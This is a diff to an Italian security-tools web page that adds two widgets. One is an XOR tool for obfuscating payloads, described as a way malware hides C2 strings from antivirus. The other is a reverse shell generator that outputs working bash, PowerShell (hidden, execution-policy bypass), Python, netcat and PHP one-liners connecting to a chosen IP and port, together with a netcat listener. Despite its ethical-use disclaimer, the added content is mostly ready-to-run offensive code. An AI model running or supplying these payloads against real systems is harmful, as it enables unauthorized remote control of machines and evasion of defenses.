@@ -1937,7 +1937,7 @@ function convertCodec(encode) {
 }
 </script>
 
-            <!-- 27. CYBERSECURITY & OSINT VIDEO LAB (YOUTUBE WORKSHOP) -->
+           <!-- 27. CYBERSECURITY & OSINT VIDEO LAB (YOUTUBE WORKSHOP) -->
 <div class="widget-large tools-box" id="osintvideolab" aria-label="OSINT & Ethical Hacking Video Workshop">
     <div class="box-title-row">
         <!-- SVG Monitor Video Cyber -->
@@ -2096,7 +2096,179 @@ function calculateEntropy() {
             <strong>🛡️ A cosa serve in Malware Analysis:</strong> Gli autori di malware utilizzano XOR e chiavi simmetriche per nascondere stringhe C2 (Command & Control), indirizzi IP e chiamate API alle firme statiche degli antivirus e degli EDR.
         </p>
         <p style="margin:0;">
-            <strong>💡 Come si usa:</strong> Inserisci il testo e digita una chiave segreta alfanumerica. Cliccando su Cifr
+            <strong>💡 Come si usa:</strong> Inserisci il testo e digita una chiave segreta alfanumerica. Cliccando su Cifra/Decifra il messaggio verrà convertito in byte esadecimali offuscati (o ripristinato).
+        </p>
+    </div>
+
+    <textarea id="symTextInput" placeholder="Inserisci il payload, testo o comando da cifrare/decifrare..."
+              style="width:100%; height:75px; padding:10px; margin-bottom:10px; background:#111; color:#fff; border:1px solid #00eaff; font-family:monospace;"></textarea>
+
+    <input id="symKeyInput" type="text" placeholder="Chiave segreta (es: SecretKey2026! o AnonLabKey)"
+           style="width:100%; padding:10px; margin-bottom:10px; background:#111; color:#00ff88; border:1px solid #00ff88; font-family:monospace;">
+
+    <div style="display:flex; gap:10px; margin-bottom:10px;">
+        <button onclick="runXorCipher(true)" style="flex:1; padding:12px; background:#00eaff; color:#000; font-weight:bold; border:none; cursor:pointer;">
+            🔒 Cifra in Hex-Payload
+        </button>
+        <button onclick="runXorCipher(false)" style="flex:1; padding:12px; background:#1a1a1a; color:#00eaff; border:1px solid #00eaff; font-weight:bold; cursor:pointer;">
+            🔓 Decifra con Chiave
+        </button>
+    </div>
+
+    <div id="symResult" aria-live="polite" style="
+        background:#000; color:#00eaff; padding:15px; margin-top:10px;
+        border:1px solid #00eaff; display:none; font-family:'Courier New', monospace; font-size:0.83rem; line-height:1.5; word-break:break-all;">
+    </div>
+</div>
+
+<script>
+function runXorCipher(isEncrypt) {
+    const text = document.getElementById("symTextInput").value.trim();
+    const key = document.getElementById("symKeyInput").value.trim();
+    const out = document.getElementById("symResult");
+
+    if (!text || !key) {
+        alert("Inserisci sia il testo che la chiave segreta.");
+        return;
+    }
+
+    out.style.display = "block";
+
+    if (isEncrypt) {
+        // Cifra e restituisce Hex
+        let hexOutput = "";
+        for (let i = 0; i < text.length; i++) {
+            const charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+            hexOutput += charCode.toString(16).padStart(2, "0");
+        }
+
+        out.innerHTML = `
+            <strong style="color:#00ff88;">[ Payload Cifrato con Chiave (HEX) ]</strong>
+            <pre style="background:#0a0a0a; padding:8px; border:1px solid #222; color:#fff; white-space:pre-wrap; margin-top:4px;">${hexOutput}</pre>
+            <span style="color:#888; font-size:0.75rem;">Per decifrare: incolla questa stringa esadecimale nel campo testo usando la stessa identica chiave segreta.</span>
+        `;
+    } else {
+        // Decifra da Hex a Testo
+        try {
+            const cleanHex = text.replace(/[^a-fA-F0-9]/g, "");
+            if (cleanHex.length % 2 !== 0) {
+                out.innerHTML = `<span style="color:#ff4444;">Errore: La stringa cifrata deve essere un esadecimale valido a byte pari.</span>`;
+                return;
+            }
+
+            let plainOutput = "";
+            let byteIndex = 0;
+            for (let i = 0; i < cleanHex.length; i += 2) {
+                const byteVal = parseInt(cleanHex.substr(i, 2), 16);
+                const originalChar = byteVal ^ key.charCodeAt(byteIndex % key.length);
+                plainOutput += String.fromCharCode(originalChar);
+                byteIndex++;
+            }
+
+            out.innerHTML = `
+                <strong style="color:#00eaff;">[ Messaggio Decifrato con Successo ]</strong>
+                <pre style="background:#0a0a0a; padding:8px; border:1px solid #222; color:#fff; white-space:pre-wrap; margin-top:4px;">${plainOutput}</pre>
+            `;
+        } catch(e) {
+            out.innerHTML = `<span style="color:#ff4444;">Errore durante la decifratura. Chiave errata o formato non conforme.</span>`;
+        }
+    }
+}
+</script>
+
+            <!-- 30. REVERSE SHELL & LISTENER COMMAND GENERATOR -->
+<div class="widget-large tools-box" id="revshellgen" aria-label="Reverse Shell Payload Generator">
+    <div class="box-title-row">
+        <!-- SVG Terminale Hacker -->
+        <svg class="box-title-icon" viewBox="0 0 24 24" fill="none" stroke="#00eaff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="background:#050c14; padding:8px; box-sizing:border-box;">
+            <polyline points="4 17 10 11 4 5" />
+            <line x1="12" y1="19" x2="20" y2="19" />
+        </svg>
+        <h3>Reverse Shell & Listener Generator</h3>
+    </div>
+
+    <!-- LEGENDA TECNICA -->
+    <div style="background:rgba(0, 234, 255, 0.03); border:1px solid rgba(0, 234, 255, 0.15); border-left:3px solid #00eaff; border-radius:6px; padding:12px 14px; margin-bottom:14px; font-size:0.8rem; line-height:1.5; color:#b0b8c4;">
+        <strong style="color:#00eaff; font-size:0.85rem; display:block; margin-bottom:6px;">📘 LEGENDA: INVERSIONE DI CONNESSIONE & CONTROLLO REMOTO</strong>
+        <p style="margin:0 0 6px 0;">
+            <strong>📌 Cos'è una Reverse Shell:</strong> È una sessione di comando interattiva avviata dalla macchina bersaglio (Target) <em>verso</em> la macchina dell'analista (Attacker/Listener), sfruttando il fatto che i firewall consentono quasi sempre il traffico in uscita (egress).
+        </p>
+        <p style="margin:0 0 6px 0;">
+            <strong>🛡️ Rilevamento nei SOC & Blue Team:</strong> I SOC analizzano i processi anomali (es. <code>powershell.exe</code> o <code>/bin/bash</code>) che stabiliscono connessioni TCP verso porte esterne non standard, bloccandoli con regole EDR e Network Segmentation.
+        </p>
+        <p style="margin:0;">
+            <strong>💡 Uso Etico:</strong> Questo generatore è destinato a test di resilienza autorizzati, certificazioni di sicurezza (OSCP/CEH) e simulazioni in ambienti di laboratorio controllati (CTF/Cyber Range).
+        </p>
+    </div>
+
+    <!-- CAMPI INPUT: IP E PORTA -->
+    <div style="display:flex; gap:10px; margin-bottom:10px;">
+        <input id="shellIp" type="text" placeholder="IP di Ascolto (es: 10.10.14.5)"
+               style="flex:2; padding:10px; background:#111; color:#fff; border:1px solid #00eaff; font-family:monospace;">
+        <input id="shellPort" type="text" placeholder="Porta (es: 4444)" value="4444"
+               style="flex:1; padding:10px; background:#111; color:#fff; border:1px solid #00eaff; font-family:monospace;">
+    </div>
+
+    <!-- SELEZIONE LINGUAGGIO / PAYLOAD -->
+    <select id="shellType" style="width:100%; padding:10px; margin-bottom:10px; background:#111; color:#00eaff; border:1px solid #00eaff; font-family:monospace;">
+        <option value="bash">Linux Bash (Standard TCP)</option>
+        <option value="powershell">Windows PowerShell (Base64 Safe)</option>
+        <option value="python">Python 3 (Cross-Platform)</option>
+        <option value="nc">Netcat (Traditional -e)</option>
+        <option value="php">PHP (Web Shell Exec)</option>
+    </select>
+
+    <button onclick="generateReverseShell()" style="
+        width:100%; padding:12px; background:#00eaff; color:#000; font-weight:bold; border:none; border-radius:4px; cursor:pointer;">
+        ⚡ Genera Comando & Listener
+    </button>
+
+    <div id="shellResult" aria-live="polite" style="
+        background:#000; color:#00eaff; padding:15px; margin-top:15px;
+        border:1px solid #00eaff; display:none; font-family:'Courier New', monospace; font-size:0.83rem; line-height:1.5;">
+    </div>
+</div>
+
+<script>
+function generateReverseShell() {
+    const ip = document.getElementById("shellIp").value.trim() || "10.10.14.5";
+    const port = document.getElementById("shellPort").value.trim() || "4444";
+    const type = document.getElementById("shellType").value;
+    const out = document.getElementById("shellResult");
+
+    out.style.display = "block";
+
+    let payload = "";
+    switch (type) {
+        case "bash":
+            payload = `sh -i >& /dev/tcp/${ip}/${port} 0>&1`;
+            break;
+        case "powershell":
+            payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+            break;
+        case "python":
+            payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
+            break;
+        case "nc":
+            payload = `nc -e /bin/bash ${ip} ${port}`;
+            break;
+        case "php":
+            payload = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+            break;
+    }
+
+    out.innerHTML = `
+        <div style="margin-bottom:10px;">
+            <strong style="color:#00ff88;">[ 1. Comando di Ascolto sul tuo computer (Netcat Listener) ]</strong>
+            <pre style="background:#0a0a0a; padding:8px; border:1px solid #222; color:#00ff88; margin-top:4px;">nc -lvnp ${port}</pre>
+        </div>
+        <div>
+            <strong style="color:#ff7b00;">[ 2. Payload da eseguire sul Target (${type.toUpperCase()}) ]</strong>
+            <pre style="background:#0a0a0a; padding:8px; border:1px solid #222; color:#fff; white-space:pre-wrap; word-break:break-all; margin-top:4px;">${payload}</pre>
+        </div>
+    `;
+}
+</script>
         </section>
 
         <!-- SIDEBAR -->
